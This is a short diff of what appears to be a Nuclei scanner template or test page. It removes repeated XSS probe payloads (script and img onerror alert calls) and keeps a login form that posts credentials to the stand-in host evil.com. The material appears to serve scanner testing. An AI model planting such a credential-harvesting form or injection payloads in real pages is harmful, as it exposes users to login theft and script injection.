@@ -8,16 +8,8 @@ info:
     </div>
     <div class="form-container">
         <img src="https://nuclei-us-west-1.s3.us-west-1.amazonaws.com/nuclei.svg">
-        <script>alert()></script>
-        <img src=x onerror=alert()>
         <form action="https://evil.com/login" method="post" class="form-signin">
-            <img src="https://nuclei-us-west-1.s3.us-west-1.amazonaws.com/nuclei.svg">
-            <script>alert()></script>
-            <img src=x onerror=alert()>
             <div class="form-group">
-                <img src="https://nuclei-us-west-1.s3.us-west-1.amazonaws.com/nuclei.svg">
-                <script>alert()></script>
-                <img src=x onerror=alert()>
                 <label for="username">Username</label>
                 <input type="text" name="username" size="20">
             </div>
